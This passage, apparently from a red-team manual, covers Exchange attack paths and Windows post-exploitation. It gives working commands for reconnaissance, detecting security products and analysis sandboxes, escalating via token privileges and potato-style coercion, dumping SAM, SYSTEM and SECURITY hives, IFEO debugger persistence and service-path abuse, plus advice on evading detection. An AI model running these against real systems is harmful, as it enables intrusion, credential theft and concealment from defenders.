Cross-reference the AD CS domain escalation material in the Coercion, Relay and Certificate Abuse section |
| Organisation Management self-elevation into `Exchange Windows Permissions` | An Exchange administrative role | The directory rights above | **Likely but verify the ACE.** Reported widely, varies with preparation vintage |
| Over-privileged `ApplicationImpersonation` or organisation-wide `FullAccess` service account | Discovery of the account, plus its password | **Read and write every mailbox in the organisation** | **Excellent.** The most common route to total mail compromise, and it is a configuration issue not a vulnerability |
| Discovery Management / compliance search | An Exchange search role | Cross-mailbox search of the whole organisation, by design | **Excellent** where you can obtain the role |
| `New-MailboxExportRequest` bulk export | The `Mailbox Import Export` role | Complete mailbox contents as PST | Works, but the loudest action in this part. Prefer targeted search |
| Inbox rule persistence and notification suppression | Mailbox access | Ongoing exfiltration, and blinding the victim to security alerts. **Survives password reset** | **Excellent**, though rule creation is an audited and frequently alerted event |
| Transport rule interception | An Exchange administrative role | Organisation-wide interception, modification and BCC. **Survives everything except its own removal** | **Excellent** yield, high visibility |
| Transport agent | Administrator on the Exchange server, plus a transport service restart | Every message through the server, invisible to all mailbox and rule review | **Excellent** durability. Underused and under-monitored |
| Mailbox permission and `Send-As` persistence | An Exchange administrative role or mailbox access | Access and impersonation that **survives password reset, MFA re-enrolment and token revocation** | **Excellent.** The most important persistence fact in this part |
| Mailbox as staging and dead-drop channel | Mailbox access | Credentialed internal storage and a C2 channel that never leaves the mail server | Good, and cross-references the Command and Control section |
| Hybrid Exchange to cloud tenant pivot (CVE-2025-53786 class) | Administrative access to a hybrid on-premises Exchange server | Cloud tenant privilege via the shared or dedicated service principal identity | **Moderate to good** depending on whether the April 2025 hotfix and the dedicated hybrid app are deployed |
| Cloud application permission (`Mail.Read`, `full_access_as_app`) | A credential on the service principal, or the ability to add one | Every mailbox in the tenant, no interactive authentication, no conditional access | **Excellent** where RBAC for Applications is not scoping it |
| Legacy authentication bypass, Exchange Online | A valid credential and an enabled legacy protocol | MFA and conditional access bypass | **Mostly dead** for the retired Basic protocols. **SMTP AUTH remains the live exception** |
| Legacy authentication bypass, on-premises Exchange | A valid credential | MFA bypass to full mailbox access via EWS or ActiveSync | **Excellent.** Nothing has changed on-premises |
| Mail gateway or security appliance compromise | Appliance reachability and an unpatched version, or credentials | Message archive, organisation-wide mail search, a privileged LDAP bind account, trusted SMTP injection | **Good.** Appliances patch slowly and hold a great deal |
| Internal SMTP spoofing via an anonymous receive connector | Network position within `RemoteIPRanges` | Internal-looking mail with no credential and no external warning banner. A phishing platform | **Good and very commonly present** |
| Mail routing reconnaissance (MX, SPF, DMARC, autodiscover) | None | Third-party sending infrastructure inventory, tenant confirmation, spoofing posture | **Excellent**, free, unauthenticated, and undetectable |



# Windows Post-Exploitation

## Situational awareness on a new host

The purpose of the first ten minutes on a host is to answer two questions: what can I do from here, and what has already noticed me. Everything else waits. The order below is deliberate, because each answer changes whether the next action is safe or even possible. Establishing your token before you try to escalate stops you burning a local exploit you did not need. Establishing what security products are present before you drop a tool to disk stops you burning the foothold entirely. Establishing whether the box is a sandbox before you reveal your infrastructure stops you burning the whole operation.

Run these as reads, not as a script. Chained bursts of reconnaissance commands are themselves the detection signature, which is covered at the end of this part.

### Who you are and what your token holds

```powershell
whoami /all
[Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object Name, User, AuthenticationType, ImpersonationLevel, IsSystem
```

`whoami /all` gives you username, SID, group membership with the deny-only flags visible, and the privilege list in one call. The three things you are reading for are: whether any group SID is marked `Group used for deny only` (you are running a UAC-filtered admin token), what your integrity level SID is, and which privileges are present and enabled.

Group membership matters beyond Administrators. **Backup Operators**, **Server Operators**, **Print Operators**, **DnsAdmins**, **Account Operators**, **Hyper-V Administrators**, **Remote Management Users**, **Distributed COM Users**, **Performance Log Users** and **Event Log Readers** are all paths to something. Backup Operators grants the backup and restore privileges on domain controllers, which is a domain compromise. Hyper-V Administrators is effectively SYSTEM on the host. DnsAdmins historically loaded an arbitrary DLL into the DNS service running as SYSTEM on a DC.

### Integrity level and whether you are elevated

The integrity level is a SID in your token, visible in `whoami /groups` as a `Mandatory Label\...` entry.

| Label | SID | Meaning |
| --- | --- | --- |
| Untrusted | `S-1-16-0` | Anonymous / heavily sandboxed |
| Low | `S-1-16-4096` | AppContainer, browser renderer, Protected Mode |
| Medium | `S-1-16-8192` | Standard user, or UAC-filtered admin |
| Medium Plus | `S-1-16-8448` | Rare, some AppContainer scenarios |
| High | `S-1-16-12288` | Elevated administrator |
| System | `S-1-16-16384` | SYSTEM / kernel-adjacent services |

```powershell
# integrity level and elevation state in one go
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
(New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
whoami /groups | Select-String 'Mandatory Label'
```

Medium integrity plus a deny-only Administrators SID means you are an administrator behind UAC, which is a token conversion problem, not a privilege escalation problem. Medium integrity with no Administrators SID at all means you need a real escalation. Low integrity means you are inside a sandbox and your first job is escaping it, since most of what follows will fail on ACL checks you cannot see the reason for.

### Domain membership and the host's role

```powershell
$cs = Get-CimInstance Win32_ComputerSystem
$cs | Select-Object Name, Domain, PartOfDomain, Manufacturer, Model, TotalPhysicalMemory, NumberOfLogicalProcessors
(Get-CimInstance Win32_OperatingSystem) | Select-Object Caption, Version, BuildNumber, ProductType, InstallDate, LastBootUpTime
nltest /dsgetdc:$DOMAIN
nltest /domain_trusts /all_trusts
```

`ProductType` is the fastest role check: `1` is a workstation, `2` is a domain controller, `3` is a member or standalone server. A `PartOfDomain` of `$false` on a server is worth noting, because a standalone box often holds locally managed credentials that are reused elsewhere and is frequently outside the estate's central logging.

Beyond the SKU, work out what the host is *for*, because that determines what credentials live on it. Look at installed software, listening ports, service accounts, and the contents of `D:\` and any non-system volume. A build server, a jump host, a backup server, a monitoring server and a certificate authority are all higher value than a domain controller in some estates, because they hold the credentials that reach everything without the monitoring that a DC gets.

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
                 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' |
  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName
Get-CimInstance Win32_Service | Where-Object { $_.StartName -and $_.StartName -notmatch '^(LocalSystem|NT AUTHORITY|NT Service)' } |
  Select-Object Name, StartName, State, PathName
```

That second query is the highest-value single command in this section. A service running as a named domain account tells you a domain credential is stored on this host in LSA secrets, tells you the account probably has a SPN and is therefore Kerberoastable, and tells you which team owns the box.

### What security products are present

Enumerating defences is unavoidable and needs to happen before you do anything loud. The cheapest reads are the driver and service lists, because every endpoint product installs a kernel component under a predictable name.

```powershell
Get-CimInstance Win32_Service | Select-Object Name, DisplayName, State, PathName |
  Where-Object { $_.PathName -match 'Defender|Sysmon|CrowdStrike|Sentinel|Carbon|Cylance|Cortex|Trellix|McAfee|Symantec|SentinelOne|Tanium|Elastic|Qualys|Rapid7|Trend|Sophos|ESET|Bit9|Airlock|ThreatLocker' }
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' | Select-Object -ExpandProperty PSChildName
Get-Process | Select-Object Name, Id, Path, Company | Sort-Object Company
```

`fltmc filters` lists loaded minifilter drivers and is the single clearest answer, but it requires elevation. The registry service-key listing above is the unprivileged equivalent: the driver names are visible even when the binaries are not readable.

For Defender specifically:

```powershell
Get-MpComputerStatus | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled, IsTamperProtected,
  BehaviorMonitorEnabled, AMEngineVersion, AntivirusSignatureLastUpdated, AMRunningMode
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object DisableRealtimeMonitoring, ExclusionPath, ExclusionProcess, ExclusionExtension, MAPSReporting, SubmitSamplesConsent
```

`AMRunningMode` distinguishes `Normal` from `Passive` and `EDR Block Mode`, which tells you whether Defender is the enforcing product or has stepped aside for a third party. Exclusion paths are worth chasing hard, because an excluded directory is a place you can stage tooling without scanning. On hardened builds the exclusion list is ACL-restricted from non-administrators, in which case Defender's own operational log leaks it: event ID **5007** records configuration changes including the exclusion registry values.

**Common mistake.** The source notes list `Get-MPPreference -DisableRealTimeMonitoring $true`. A `Get-` cmdlet takes no such switch and disables nothing. The write is `Set-MpPreference -DisableRealtimeMonitoring $true`, it requires elevation, it fails outright when Tamper Protection is on, and it raises Defender event **5001** plus a high-severity alert in any managed console. Reading configuration is quiet. Changing it is not.

Application control matters as much as antivirus here, so check it in the same pass. That is covered in full later in this part, but the two-line version is `Get-AppLockerPolicy -Effective -Xml` and the `Win32_DeviceGuard` query for WDAC.

### Virtual machine and sandbox

Every modern estate is virtualised, so detecting a hypervisor tells you almost nothing on its own. What you are actually trying to distinguish is a real corporate endpoint from an analysis sandbox that is watching you.

```powershell
Get-CimInstance Win32_ComputerSystem | Select-Object Manufacturer, Model
Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SerialNumber, SMBIOSBIOSVersion
Get-CimInstance Win32_DiskDrive | Select-Object Model, Size
Get-NetAdapter | Select-Object Name, MacAddress, InterfaceDescription
```

Manufacturer and model give away the platform: `VMware, Inc.`, `Microsoft Corporation` with model `Virtual Machine` for Hyper-V, `innotek GmbH` or `VirtualBox` for VirtualBox, `QEMU` or `Bochs` for KVM, `Xen`, `Amazon EC2`, `Google Compute Engine`. MAC prefixes corroborate: `00:0C:29` and `00:50:56` for VMware, `00:15:5D` for Hyper-V, `08:00:27` for VirtualBox.

The sandbox indicators are about the *shape of the host*, not the hypervisor. Two logical processors and four gigabytes of memory, a disk under sixty gigabytes, an uptime of eleven minutes, one user profile created the same day as the OS, an empty recent-documents list, no browser history, no domain membership, no installed line-of-business software, and a hostname like `WIN-` followed by random characters, together mean you are in an analysis environment.

```powershell
# host-shape signals, cheap and unlikely to be flagged individually
((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes
Get-ChildItem C:\Users | Select-Object Name, CreationTime, LastWriteTime
(Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue).Count
Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object DeviceID, Size, FreeSpace
```

A real user's profile has years of accumulated debris. A sandbox's does not, no matter how much the vendor tries.

### Network position and reachable segments

```powershell
Get-NetIPConfiguration -Detailed
Get-NetRoute -AddressFamily IPv4 | Sort-Object RouteMetric | Select-Object DestinationPrefix, NextHop, InterfaceAlias, RouteMetric
Get-NetNeighbor -AddressFamily IPv4 | Where-Object State -ne Unreachable
Get-NetTCPConnection -State Listen, Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
Get-DnsClientServerAddress -AddressFamily IPv4
netsh winhttp show proxy
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyEnable, ProxyServer, AutoConfigURL
```

The routing table is the map. Additional interfaces, a second default route, a VPN adapter, or specific routes to RFC1918 ranges you cannot see from your current position all mean this host is a bridge into a segment you could not otherwise reach. Established connections tell you what this host legitimately talks to, which is both a target list and a cover story: traffic to a destination this host already contacts routinely is far less interesting to a network analyst than traffic to something new.

The proxy configuration determines whether your egress works at all and whether it is inspected. An `AutoConfigURL` pointing at a WPAD or PAC file, and a `ProxyServer` value, mean outbound HTTP is brokered and probably TLS-inspected and logged with the authenticating user attached to every request.

### Logged-on users and active sessions

```powershell
quser
qwinsta
Get-CimInstance Win32_LoggedOnUser | Select-Object -ExpandProperty Antecedent -Unique
Get-Process -IncludeUserName | Group-Object UserName | Select-Object Name, Count
Get-SmbSession        # requires elevation
Get-SmbOpenFile       # requires elevation
```

Other sessions are both opportunity and risk. Opportunity because an interactive session by a privileged user means their credentials or a usable token are in memory on this host, and their Kerberos tickets are in the LSA cache. Risk because a logged-on user will see your windows, notice CPU spikes, wonder why their terminal flickered, and phone the helpdesk. An administrator's RDP session on the same box you are working on is the most common cause of an operation being discovered by a human rather than a product.

`Get-Process -IncludeUserName` requires elevation to see other users' processes; without it, the absence of results is not evidence of absence.

### Whether you have been noticed

Ask this early, not after something goes wrong. The cheap checks are whether your process is still running, whether your beacon interval has been disrupted, and whether the local security products have logged a detection.

```powershell
Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 50 -ErrorAction SilentlyContinue |
  Where-Object Id -in 1006,1007,1015,1116,1117,5001,5007,5010,5012 |
  Select-Object TimeCreated, Id, Message
```

Event **1116** is a detection, **1117** is an action taken on one, **5001** is real-time protection being disabled, **5007** is a configuration change. If you see a 1116 for a file you dropped, that file's hash and path are already in a cloud console and the account you used to write it is attached to the event. Stop, assume the tooling is burned, and change approach rather than retrying the same binary from a different directory.

The security event log itself is usually unreadable without elevation and, in a well-run estate, is forwarded off-host in seconds anyway, so its local contents tell you less than you would like. What it does tell you, if you can read it, is whether the estate has command-line auditing (4688 with a command line field), whether PowerShell script block logging is on (4104 in the PowerShell operational log), and whether Sysmon is installed and what its configuration excludes.

## Token privileges as the central privilege escalation concept

Everything else in local privilege escalation is a way of eventually holding a better token. Token privileges are the direct route, and on service accounts they are usually already sitting there waiting. This is the first thing to check and the last thing most operators check properly.

A **privilege** is a right to perform a system-wide operation, held by an access token, independent of any object's DACL. That independence is the point: `SeBackupPrivilege` lets you read a file whose ACL denies you, not because the ACL is re-evaluated in your favour but because the file system is told to skip the access check entirely. Privileges are also separately *present* and *enabled*. A privilege that is present but disabled can be enabled by the holding process at any time with `AdjustTokenPrivileges` and no additional authorisation, so "Disabled" in `whoami /priv` output means available, not unavailable. Only `SeChangeNotifyPrivilege` is special-cased as always enabled.

### Enumerating them

```powershell
whoami /priv
```

```csharp
// in-process equivalent, avoids spawning whoami.exe which is a well-known recon signature
// OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, out h) then
// GetTokenInformation(h, TokenPrivileges, ...) and LookupPrivilegeName on each LUID
```

Do this in every context you land in, not once per host. A web shell in an IIS application pool, a SQL Server `xp_cmdshell` context, a scheduled task running as a service account, and an interactive user shell on the same machine hold materially different privilege sets. The IIS application pool identity and the SQL Server service account both typically hold `SeImpersonatePrivilege`, which is a straight line to SYSTEM, while the interactive user next to them holds nothing useful.

Service accounts that habitually hold impersonation privileges: `NT AUTHORITY\LOCAL SERVICE`, `NT AUTHORITY\NETWORK SERVICE`, `IIS APPPOOL\*`, `NT SERVICE\MSSQLSERVER` and its named-instance equivalents, and any account granted the "Impersonate a client after authentication" or "Log on as a service" user right.

### The exploitable privileges

| Privilege | Display name | What it actually grants | Route to SYSTEM |
| --- | --- | --- | --- |
| `SeImpersonatePrivilege` | Impersonate a client after authentication | Assign an obtained impersonation token to your thread, and use `CreateProcessWithTokenW` | Direct, via coerced local authentication. The single most valuable privilege |
| `SeAssignPrimaryTokenPrivilege` | Replace a process level token | Set a primary token on a new process via `CreateProcessAsUser` | Direct, same coercion primitives, different final API. Usually appears alongside `SeIncreaseQuotaPrivilege` |
| `SeDebugPrivilege` | Debug programs | `OpenProcess` with `PROCESS_ALL_ACCESS` on any process including protected-mode candidates | Open LSASS and dump it, or open a SYSTEM process and steal or duplicate its token, or inject |
| `SeBackupPrivilege` | Back up files and directories | Read any file or registry hive with the access check bypassed, via `FILE_FLAG_BACKUP_SEMANTICS` and `RegSaveKey` | `reg save` of SAM, SYSTEM and SECURITY, then offline extraction. On a DC, read `ntds.dit` |
| `SeRestorePrivilege` | Restore files and directories | Write any file or registry value with the access check bypassed, and set arbitrary owners | Overwrite a service binary, write a service `ImagePath`, or set an Image File Execution Options debugger |
| `SeTakeOwnershipPrivilege` | Take ownership of files or other objects | Acquire `WRITE_OWNER` on any securable object without being granted access to it | Take ownership of a SYSTEM-owned binary or key, rewrite its DACL, then modify it |
| `SeCreateTokenPrivilege` | Create a token object | Call `NtCreateToken` and mint a token with arbitrary SIDs and privileges | Forge a token containing the SYSTEM SID and every privilege. Rarely granted, total when it is |
| `SeLoadDriverPrivilege` | Load and unload device drivers | Call `NtLoadDriver` against a driver service definition | Load a signed vulnerable driver and use its arbitrary kernel read/write. Constrained by driver signing, HVCI and the vulnerable driver blocklist |
| `SeTcbPrivilege` | Act as part of the operating system | Call `LsaLogonUser` and other LSA interfaces trusted to assert identity | Log on a session with arbitrary group membership, including Administrators, and receive its token |
| `SeManageVolumePrivilege` | Perform volume maintenance tasks | Obtain full control of a volume device, which is convertible into arbitrary file write on that volume | Write a DLL into `System32` and wait for a privileged load, or overwrite an existing binary |
| `SeSecurityPrivilege` | Manage auditing and security log | Read and clear the security log, and modify SACLs on objects you have no other access to | Not directly SYSTEM. Clears your traces and disables auditing on paths you intend to abuse |
| `SeRelabelPrivilege` | Modify an object label | Raise or lower the integrity label of an object | Lower a high-integrity object's label so a medium-integrity process can write it |
| `SeSystemEnvironmentPrivilege` | Modify firmware environment values | Write UEFI and firmware environment variables | Niche, platform-dependent, but a persistence and boot-integrity concern |
| `SeShutdownPrivilege` | Shut down the system | Reboot the host | Only useful as the trigger for a service or task abuse that needs a restart |

`SeChangeNotifyPrivilege`, `SeIncreaseWorkingSetPrivilege`, `SeTimeZonePrivilege`, `SeUndockPrivilege`, `SeCreateGlobalPrivilege` and the profiling privileges are noise. Their presence tells you nothing except that you have a normal token. A UAC-filtered administrator token holds exactly that noise set plus a deny-only Administrators SID, which is how you distinguish it from a genuine standard user at a glance.

### The impersonation family, by mechanism

The source notes reduce this to two binary names. Both are signatured by name, hash and behaviour, so knowing only the names means being stuck the moment they are blocked. What follows is the mechanism, which is stable, unlike the tooling.

Windows impersonation exists so a server can act on behalf of a client. When a client authenticates to a server over a local IPC transport, the server can obtain a token representing the client and adopt it for the duration of a request. Two things gate this. First, the client's token must be shared at `SecurityImpersonation` level or higher, which the client chooses when it connects. Second, the server thread must hold `SeImpersonatePrivilege` to adopt a token that is not its own.

The attack inverts the roles. **You** stand up the server. You make something running as SYSTEM be the client. It authenticates to you, you receive its token at impersonation level, and because you hold `SeImpersonatePrivilege` you are permitted to wear it. Then you duplicate that impersonation token into a primary token and use it to create a process.

The full chain in order:

1. Create an IPC endpoint you control. Classically a named pipe, `\\.\pipe\anything`, via `CreateNamedPipe`. Named pipes are the ideal choice because a pipe name is expressible as a UNC path, `\\localhost\pipe\anything`, which means any API that accepts a file path can be tricked into connecting to it.
2. Coerce a SYSTEM-context service into connecting to that path. This is the only part that changes between tools, and it is the part worth collecting alternatives for.
3. Call `ImpersonateNamedPipeClient` on the server end. Your thread now carries the SYSTEM impersonation token.
4. `OpenThreadToken`, then `DuplicateTokenEx` with `TokenPrimary` to convert impersonation into a primary token.
5. `CreateProcessWithTokenW` with that primary token, which requires `SeImpersonatePrivilege`. If you hold `SeAssignPrimaryTokenPrivilege` instead, use `CreateProcessAsUser`, which requires that privilege and `SeIncreaseQuotaPrivilege`.

The coercion primitives are the interesting inventory, because when a named tool is blocked you are looking for another way to accomplish step 2:

| Coercion primitive | Mechanism | Notes |
| --- | --- | --- |
| Print Spooler RPC | `RpcRemoteFindFirstPrinterChangeNotificationEx` accepts a UNC notification target. Point it at `\\localhost\pipe\...` and the spooler, running as SYSTEM, connects | The `PrintSpoofer` technique. Dies where the Spooler service is disabled, which is now common on servers post-PrintNightmare |
| MS-EFSRPC over a local pipe | The Encrypting File System remote protocol accepts a path argument. Called against the local `\pipe\lsarpc` or `\pipe\efsrpc` interface, it makes SYSTEM authenticate to a path you supply | The `EfsPotato` and `SharpEfsPotato` family. Survives Spooler being disabled |
| DCOM activation with a controlled OXID resolver | Activating certain DCOM objects causes the SYSTEM-context DCOM launcher to resolve an object exporter ID by contacting an RPC endpoint mapper. Redirect that resolution and you receive a local NTLM authentication you can relay to a local RPC or SMB endpoint | The `RottenPotato`, `JuicyPotato`, `RoguePotato`, `GodPotato` and `DCOMPotato` lineage. `JuicyPotato` broke on Windows 10 1809 and Server 2019 because arbitrary port specification for the activation was removed; `RoguePotato` reintroduced it by proxying via a remote port 135; `GodPotato` reworked it into a version-agnostic local fake OXID resolver |
| Cross-protocol NTLM reflection | SYSTEM authentication captured over one protocol and replayed into another local endpoint that does not apply the reflection mitigation | The `LocalPotato` technique, CVE-2023-21746, which yields arbitrary file write rather than a token directly. Patched, but the class recurs |
| WebClient / WebDAV | The WebClient service can be induced to authenticate to a host-header-controlled WebDAV path | Requires the WebClient service, present on workstations, generally absent on servers |
| Task Scheduler, MSDTC, BITS, and other SYSTEM services | Any SYSTEM service accepting a file, UNC or path argument is a candidate | This is the search space. Anything that opens a caller-supplied path from a SYSTEM context is a coercion primitive waiting to be named |

The generalisation is the whole point: **any SYSTEM-context service that can be made to open a path you supply is an impersonation primitive**, because the pipe namespace is reachable through the file namespace. When `PrintSpoofer.exe` is blocked by hash and `GodPotato.exe` is blocked by name, you are not out of options, you are looking for a different step 2 and writing thirty lines of C# for steps 1 and 3 through 5.

```text
# the concrete tools, for reference. All are heavily signatured by name and hash.
PrintSpoofer     Spooler named-pipe coercion
GodPotato        DCOM/RPC fake OXID resolver, broad version coverage
RoguePotato      DCOM activation via remote 135 redirect
EfsPotato / SharpEfsPotato   MS-EFSRPC local coercion
DCOMPotato       DCOM services configured with impersonation-level auth
SweetPotato      aggregator of several of the above primitives
```

Run any of them as-is and expect a detection. The behavioural signature is not the file, it is the sequence: a medium-or-lower integrity process creates a named pipe, a SYSTEM service connects to it, and moments later a new process exists with a SYSTEM token and a non-SYSTEM parent. ETW Threat Intelligence surfaces the token duplication directly. Renaming the binary changes nothing. What changes the outcome is doing steps 1 to 5 in-process from your implant so there is no child process creation at all, and keeping the resulting token for API use rather than spawning a shell with it.

### Backup and restore, in practice

`SeBackupPrivilege` bypasses read access checks; `SeRestorePrivilege` bypasses write access checks. Neither takes effect implicitly. The calling code must enable the privilege and then pass `FILE_FLAG_BACKUP_SEMANTICS` when opening the file, or use `RegSaveKey`, which enables the semantics for you. This is why `type C:\Windows\System32\config\SAM` still fails while holding `SeBackupPrivilege`: `type` does not ask for backup semantics, and the hive is also exclusively locked.

```cmd
reg save HKLM\SAM C:\Windows\Tasks\sam.hiv
reg save HKLM\SYSTEM C:\Windows\Tasks\system.hiv
reg save HKLM\SECURITY C:\Windows\Tasks\security.hiv
```

`reg save` works because it uses `RegSaveKey`, which honours the privilege and reads the live hive rather than the locked file. Extract offline against the hives rather than running a credential dumper on the host. `SECURITY` is the one people forget and it is often the most valuable, because it holds LSA secrets: service account plaintexts, the machine account password, DPAPI backup material, and any cached auto-logon password.

On a domain controller, `SeBackupPrivilege` is a domain compromise, since it lets you read `ntds.dit`. The file is locked, so the standard route is a volume shadow copy, which needs administrative rights, or a raw NTFS read that walks the MFT and ignores the lock. That second approach is what makes the privilege dangerous in isolation: it does not need Administrators membership, only Backup Operators.

`SeRestorePrivilege` is the mirrored primitive and is usually the faster escalation of the two. Write access to any location makes a service binary replacement or an Image File Execution Options debugger entry trivial:

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\Tasks\payload.exe" /f
```

IFEO debugger entries are a first-class detection now, watched by essentially every EDR product, so treat this as a demonstration of the primitive rather than a recommendation.

### Debug

`SeDebugPrivilege` is normally only granted to Administrators, so finding it on a non-admin token means something is misconfigured in your favour and it is worth checking for explicitly. It defeats process-level ACLs, so you can open a SYSTEM process and either dump it or duplicate its token, which is the cleanest escalation there is because it involves no coercion, no dropped binary and no new process.

LSA protection changes the calculus. With `RunAsPPL` enabled, LSASS runs as a protected process light and `OpenProcess` with the accesses needed to read its memory is refused at the kernel level regardless of `SeDebugPrivilege`, because protected-process checks precede the privilege check. Removing that protection means either a signed driver that can clear the protection bit, or setting `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL` to `0` and rebooting, which is loud and slow. Credential Guard goes further and moves the secrets into a VBS-isolated LSAIso process, at which point the memory you can read no longer contains what you want. Check both before you plan around LSASS:

```powershell
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' | Select-Object RunAsPPL, RunAsPPLBoot, LsaCfgFlags
Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard |
  Select-Object SecurityServicesConfigured, SecurityServicesRunning, VirtualizationBasedSecurityStatus
```

In `SecurityServicesRunning`, a value of `1` is Credential Guard and `2` is HVCI.

### Take ownership, create token, load driver, TCB

These four are rarer and each is decisive on its own.

`SeTakeOwnershipPrivilege` is a two-step primitive. It grants `WRITE_OWNER` on any securable object without any other access. You set yourself as owner, and because an owner always has the implicit right to modify the DACL, you then grant yourself full control and proceed. It works on files, registry keys, services and any other securable object, which makes it broader than either backup or restore. The trap is that changing ownership on a system binary is permanent, obvious and breaks servicing, so pick a target that will not be noticed, or restore the original owner and DACL afterwards.

`SeCreateTokenPrivilege` is total. `NtCreateToken` lets you specify the user SID, group SIDs, privilege array, owner, primary group and default DACL. You mint a token containing `S-1-5-18` and every privilege enabled, and you are SYSTEM without touching another process. It is almost never granted, so when `whoami /priv` shows it, stop looking for anything else.

`SeLoadDriverPrivilege` gives kernel code execution subject to driver signing. The classic path defines a driver service under a registry key you control, historically under `HKCU`, and calls `NtLoadDriver` with the registry path, which sidesteps the Service Control Manager and its ACLs. Modern constraints are real: the driver must be validly signed, HVCI blocks a large class of otherwise-loadable drivers, and Microsoft's vulnerable driver blocklist rejects the well-known bring-your-own-vulnerable-driver candidates by hash. The technique is still viable with a less well-known signed driver, but treat it as the noisiest option available, since driver loads are logged, attested and, on any competent EDR, alerted on individually.

`SeTcbPrivilege` marks the holder as trusted by the LSA. With it you can call `LsaLogonUser` and assert group memberships that were not granted to the account, receiving a token that contains them. It is the privilege that underpins a legitimate authentication package, and holding it outside of one is equivalent to being able to say "I am an administrator" and be believed.

### The assign-primary-token case

`SeAssignPrimaryTokenPrivilege` without `SeImpersonatePrivilege` appears on some service accounts and confuses people, because most published tooling calls `CreateProcessWithTokenW`, which needs impersonation and will fail with `ERROR_PRIVILEGE_NOT_HELD`. The fix is the sibling API: `CreateProcessAsUser` requires `SeAssignPrimaryTokenPrivilege` and `SeIncreaseQuotaPrivilege` instead, and those two travel together in the privilege sets where this comes up. Everything about obtaining the token is unchanged; only the process-creation call differs. Tools in the potato family that offer a choice of process-creation method are covering exactly this case, and if the one you are using does not, that is a five-line change rather than a dead end.

## The local privilege escalation surface

Everything here is a variant of one idea: a privileged process consumes something a less privileged user controls. The thing consumed is a path, a binary, a registry value, an environment variable, a DLL name, a file the process is about to create, or a credential someone wrote down. Learn the shape and you stop needing a checklist.

### Unquoted service paths

**What it is.** A service whose `ImagePath` contains spaces and is not quoted. Windows resolves the ambiguity by trying successive prefixes, so a writable directory earlier in the path becomes code execution as the service account.

**Why it works.** `CreateProcess` receives a command line, not a separated image path and argument list. When the image path is unquoted, it cannot know where the executable name ends, so it tries each possibility left to right, appending `.exe`. `C:\Program Files\Some App\service.exe -flag` is attempted as `C:\Program.exe`, then `C:\Program Files\Some.exe`, then `C:\Program Files\Some App\service.exe`. Any of those you can create, you win. Note that writing `C:\Program.exe` requires write access to the root of the system drive, which is denied to standard users by default; the intermediate directories are the realistic target.

**Preconditions.** Write access to a directory that forms one of the tried prefixes, plus the ability to restart the service or wait for a reboot.

```powershell
Get-CimInstance Win32_Service | Where-Object {
  $_.PathName -and $_.PathName -notmatch '^\s*"' -and $_.PathName -match '\s' -and $_.PathName -notmatch '^C:\\Windows\\'
} | Select-Object Name, StartName, State, StartMode, PathName
```

```cmd
:: check whether you can restart it, and confirm the path
sc.exe qc "$SERVICE"
sc.exe stop "$SERVICE" && sc.exe start "$SERVICE"
```

**Verify it worked.** The new process appears with the service account's token: `Get-Process -IncludeUserName` or a callback in your listener. `sc.exe query "$SERVICE"` will report the service as failing to start, because your binary is not a real service and will not respond to the SCM within the timeout, which is the tell that you succeeded and also the tell a monitoring system sees.

**Detection and opsec.** Service configuration is not modified, so there is no 7045 or 4697. What is logged is the process creation with an unusual image path and a `services.exe` parent, and System log event **7000** or **7009** for the service failing to start or timing out. Repeated service start failures are a common alert. A payload that immediately spawns a child and then responds correctly to the SCM avoids the timeout noise.

**Failure modes.** `Access is denied` on `sc stop` means you have no service control rights and are waiting for a reboot. The service starting normally means your prefix guess was wrong, usually because the path is actually quoted in the registry and only appears unquoted in some tooling's output. A service that is `Disabled` will never start regardless.

### Weak service permissions and binary replacement

**What it is.** Three distinct weaknesses that all end in the same place: permission on the service object itself, permission on the service's binary, and permission on the directory containing the binary.

**Why it works.** A service is a securable object with its own DACL. `SERVICE_CHANGE_CONFIG` lets you rewrite `binPath` and the account it runs as. `WRITE_DAC` or `WRITE_OWNER` lets you grant yourself `SERVICE_CHANGE_CONFIG`. Separately, if the binary's file DACL grants you write, or its parent directory grants you create-file and delete, you replace the binary without touching the service configuration at all, which is considerably quieter. `Authenticated Users` with write access to a vendor's install directory under `C:\Program Files` is the single most common real-world finding in this category, and it usually comes from an installer that copied a permissive ACL rather than from anyone's decision.

```cmd
:: service object DACL, in SDDL
sc.exe sdshow "$SERVICE"
```

```powershell
# binary and directory ACLs for every non-Microsoft service, filtered to writable-by-you
Get-CimInstance Win32_Service | ForEach-Object {
  if ($_.PathName -match '^\s*"?([A-Za-z]:\\[^"]+?\.exe)') {
    $bin = $Matches[1]
    [pscustomobject]@{ Service = $_.Name; Account = $_.StartName; Binary = $bin; Dir = (Split-Path $bin) }
  }
} | Sort-Object Binary -Unique | ForEach-Object {
  $_ | Add-Member -NotePropertyName BinAcl -NotePropertyValue ((Get-Acl $_.Binary -ErrorAction SilentlyContinue).AccessToString) -PassThru
